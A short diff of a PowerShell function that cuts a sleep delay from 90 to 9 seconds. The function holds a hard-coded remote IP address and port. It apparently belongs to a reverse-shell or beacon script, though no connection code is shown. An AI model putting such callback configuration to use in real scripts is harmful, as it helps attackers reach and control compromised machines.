@@ -2,7 +2,7 @@ Function Massiel {
 
         Try {
 
-            Start-Sleep -Seconds 90
+            Start-Sleep -Seconds 9
 
             $Hosts = '104.168.62.5'
             $Port = 6060
